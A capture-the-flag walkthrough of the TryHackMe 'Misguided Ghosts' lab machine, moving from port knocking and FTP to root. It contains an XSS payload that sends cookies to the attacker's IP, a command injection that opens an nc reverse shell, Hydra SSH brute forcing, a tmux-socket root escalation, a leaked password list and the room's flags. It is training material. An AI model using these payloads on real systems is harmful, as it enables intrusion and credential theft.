# Misguided Ghosts

Explore your inner daemons with this hard box!

[Misguided Ghosts](https://tryhackme.com/room/misguidedghosts)

## Topic's

- Network Enumeration
- FTP Enumeration
- Port Knocking
- Web Enumeration
- SSL Enumeration
- Cookie Manipulation
- Code Injection
- Brute Forcing (Vigenere)
- SMB Enumeration
- Brute FOrcing (SSH)
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Misguided Ghosts

Hard times, gonna make you wonder why you even try, Hard times, gonna take you down and laugh while you cry.

Like Hayley, you'll encounter some new stuff. There's no guidance for this box, good luck finding your way!

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo nmap -A -sS -sC -sV -O 10.10.79.34
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 09:55 CET
Nmap scan report for 10.10.79.34
Host is up (0.034s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
21/tcp   open     ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
8080/tcp filtered http-proxy
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/27%OT=21%CT=1%CU=41860%PV=Y%DS=2%DC=T%G=Y%TM=5F97E0
OS:91%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   33.72 ms 10.8.0.1
2   34.81 ms 10.10.79.34

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.29 seconds
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ ftp 10.10.79.34
Connected to 10.10.79.34.
220 (vsFTPd 3.0.3)
Name (10.10.79.34:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           103 Aug 28 18:11 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26 18:51 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18 18:12 trace.pcapng
226 Directory send OK.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: info.txt remote: info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for info.txt (103 bytes).
226 Transfer complete.
103 bytes received in 0.08 secs (1.2136 kB/s)
local: jokes.txt remote: jokes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for jokes.txt (248 bytes).
226 Transfer complete.
248 bytes received in 0.11 secs (2.2531 kB/s)
local: trace.pcapng remote: trace.pcapng
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for trace.pcapng (737512 bytes).
226 Transfer complete.
737512 bytes received in 0.38 secs (1.8431 MB/s)
ftp> exit
221 Goodbye.
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat info.txt
I have included all the network info you requested, along with some of my favourite jokes.

- Paramore
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat jokes.txt
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```

![](./2020-10-27_10-03.png)

`7864 8273 9241 12007 60753`

```
knock 10.10.79.34 7864 8273 9241 12007 60753
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo nmap -A -sS -sC -sV -O 10.10.79.34
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 10:09 CET
Nmap scan report for 10.10.79.34
Host is up (0.036s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28 18:11 pub
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
|_http-title: Misguided Ghosts
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
| Not valid before: 2020-08-11T16:52:11
|_Not valid after:  2021-08-11T16:52:11
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/27%OT=21%CT=1%CU=43284%PV=Y%DS=2%DC=T%G=Y%TM=5F97E3
OS:F9%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   45.49 ms 10.8.0.1
2   45.63 ms 10.10.79.34

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.92 seconds
```

```
https://10.10.79.34:8080/
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -k 2>/dev/null
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.79.34:8080
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/27 10:12:29 Starting gobuster
===============================================================
/login (Status: 200)
/dashboard (Status: 302)
/console (Status: 200)
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/27 10:18:15 Finished
===============================================================
```

[https://10.10.79.34:8080/login](https://10.10.79.34:8080/login)

![](./2020-10-27_10-22.png)

```
E = zac@misguided_ghosts.thm
CN = misguided_ghosts.thm
O = Misguided Ghosts
L = Franklin
ST = Williamson Country
C = TN
```

`zac:zac`

[https://10.10.79.34:8080/dashboard](https://10.10.79.34:8080/dashboard)

```html
&lt;sscriptcript&gt;var i = new Image();i.src = "http://10.8.106.222/" +
document.cookie;&lt;/sscriptcript&gt;
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
kali
10.8.106.222 - - [27/Oct/2020 10:30:19] code 404, message File not found
10.8.106.222 - - [27/Oct/2020 10:30:19] "GET /login=zac_from_paramore HTTP/1.1" 404 -
10.10.79.34 - - [27/Oct/2020 10:32:02] code 404, message File not found
10.10.79.34 - - [27/Oct/2020 10:32:02] "GET /login=hayley_is_admin HTTP/1.1" 404 -
```

`hayley_is_admin`

```
gobuster dir -t 50 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.79.34:8080 -c "login=hayley_is_admin" -k 2>/dev/null
```

[https://10.10.79.34:8080/photos](https://10.10.79.34:8080/photos)

![](./2020-10-27_10-36.png)

![](./2020-10-27_10-37.png)

[https://10.10.79.34:8080/photos?image=.](https://10.10.79.34:8080/photos?image=.)

![](./2020-10-27_10-42.png)

```
image=.;nc${IFS}10.8.106.222${IFS}9001${IFS}-e${IFS}/bin/sh
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.79.34 43255
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

```
cd /home/zac
ls
notes
ls -la
total 12
drwxr-xr-x    3 root     root          4096 Oct 27 09:08 .
drwxr-xr-x    1 root     root          4096 Oct 27 09:08 ..
drwxrwxr-x    2 1001     1001          4096 Aug 26 02:11 notes
cd notes
ls -la
total 16
drwxrwxr-x    2 1001     1001          4096 Aug 26 02:11 .
drwxr-xr-x    3 root     root          4096 Oct 27 09:08 ..
-rw-r--r--    1 1001     1002          1675 Aug 25 00:14 .id_rsa
-rw-r--r--    1 1001     1002           270 Aug 25 00:34 .secret
cat .secret
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
cat .id_rsa
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----

```

[https://en.wikipedia.org/wiki/Known-plaintext_attack](https://en.wikipedia.org/wiki/Known-plaintext_attack)

[https://github.com/bobloblaw321/vigenereBruteForce](https://github.com/bobloblaw321/vigenereBruteForce)

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ grep -ie ^[a-z]*$ /usr/share/wordlists/rockyou.txt >> wordlist.txt
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ node vigenere_brute_force.js -w wordlist.txt -c NCB -u MII
----------------------------------------------
Cooking up some keys
Bob Loblaw's Vigenere Cipher Brute Force tool
----------------------------------------------

The key is: butterfly
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ ssh -i id_rsa zac@10.10.118.136
The authenticity of host '10.10.118.136 (10.10.118.136)' can't be established.
ECDSA key fingerprint is SHA256:lwZSBIMEUyCAAp1GbfZxfjHOYrY4UplzuJl2VWsR8QE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.118.136' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Are you ready for Kubernetes 1.19? It's nearly here! Try RC3 with
   sudo snap install microk8s --channel=1.19/candidate --classic

   https://microk8s.io/ has docs and details.

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

8 packages can be updated.
0 updates are security updates.


Last login: Wed Aug 26 14:27:15 2020 from 192.168.236.128
zac@misguided_ghosts:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:139           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:43537         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:445           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:38915         0.0.0.0:*               LISTEN      -
tcp6       0      0 ::1:139                 :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:445                 :::*                    LISTEN      -
udp        0      0 0.0.0.0:44135           0.0.0.0:*                           -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 10.10.118.136:68        0.0.0.0:*                           -
zac@misguided_ghosts:~$
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ smbclient -L localhost -p 1234
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        local           Disk      Local list of passwords for our services
        IPC$            IPC       IPC Service (misguided_ghosts server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ cat passwords.bak
pft7vPl
HQ@5Y64
Ls7kZxv
KPBRFJz
fKtBSbx
FWbnrxr
Kz#SPqn
c4CTRWm
5asYk73
WikHqvi
aBc123!
JPXxIMs
AHwbOmm
tXWsJ3J
QJPQWW0
3bmBhNv
xV!sce1
1bJP1af
DLH4cgw
bRBdPRk
```

```
kali@kali:~/CTFs/tryhackme/Misguided Ghosts$ hydra -l hayley -P passwords.bak ssh://10.10.118.136
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-27 12:20:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 20 login tries (l:1/p:20), ~2 tries per task
[DATA] attacking ssh://10.10.118.136:22/
[22][ssh] host: 10.10.118.136   login: hayley   password: aBc123!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-27 12:20:44
```

```
hayley@misguided_ghosts:~$ ls
user.txt
hayley@misguided_ghosts:~$ cat user.txt
{d0ck3r_35c4p3}
```

```
hayley@misguided_ghosts:~$ ps -aux | grep root
root      1070  0.0  0.1  28540  3624 ?        Ss   11:13   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d
```

```
hayley@misguided_ghosts:/opt$ tmux -S /opt/.details

# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
{p1v0t1ng_15_fun}
```

1. What is the user flag?

`{d0ck3r_35c4p3}`

2. What is the root flag?

`{p1v0t1ng_15_fun}`
